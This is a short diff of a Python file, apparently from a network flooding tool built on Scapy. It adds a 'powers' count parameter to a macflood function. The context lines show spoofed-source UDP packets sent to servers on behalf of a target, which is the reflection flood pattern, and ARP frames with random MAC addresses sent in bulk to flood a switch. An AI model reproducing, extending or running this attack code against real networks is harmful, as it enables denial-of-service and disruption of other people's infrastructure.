@@ -41,7 +41,7 @@ def sends(data, port):
 		packet = send(IP(dst=servers, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))
 
 
-def macflood(target):
+def macflood(target, powers):
 	sendp(Ether(src=RandMAC(), dst=target )/ARP(op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18), count=int(powers))
 
 
